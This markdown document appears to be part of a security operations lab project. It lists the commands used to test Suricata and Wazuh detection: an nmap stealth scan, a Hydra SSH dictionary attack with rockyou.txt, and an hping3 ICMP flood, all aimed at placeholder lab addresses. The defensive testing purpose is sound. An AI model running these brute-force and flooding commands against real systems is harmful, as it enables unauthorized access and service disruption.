# ⚔️ Threat Emulation & Attack Simulation Commands

This document records the exact commands used to simulate cyber attacks during the validation phase of the SOC Lab. These activities were executed from an attacking machine (Kali Linux/Ubuntu) targeting the monitored corporate network endpoints to verify the detection capabilities of **Suricata IDS** and **Wazuh SIEM**.

---

## 1. Network Reconnaissance (Nmap Scan)
**Objective:** Simulate an attacker performing host discovery and port scanning to map the internal network.  
**Target:** `PC-Client1` (Windows 10)

### Stealth SYN Scan & OS Fingerprinting
```bash
sudo nmap -sS -sV -O -F 192.168.x.x
```


## 2. Authentication Abuse (SSH Brute Force)
**Objective:** Simulate a high-volume automated credential stuffing/brute-force attack against an exposed SSH service.
**Target:** Ubuntu-Client (Port 22)

## Dictionary Attack using Hydra
```Bash
hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.x -t 4 -V
```


## 3. Denial of Service (ICMP Flood)
**Objective:** Simulate a basic network layer volumetric attack (DoS) designed to overwhelm the target network interface or trigger anomaly-based signatures.
**Target:** Ubuntu-Client

High-Velocity Ping Flood (Hping3)
```Bash
sudo hping3 --icmp --flood 192.168.x.x
```


🛑 Security Disclaimer
All simulation activities documented above were conducted strictly within a private, isolated host-only virtual laboratory environment. No external or unauthorized production networks were targeted.
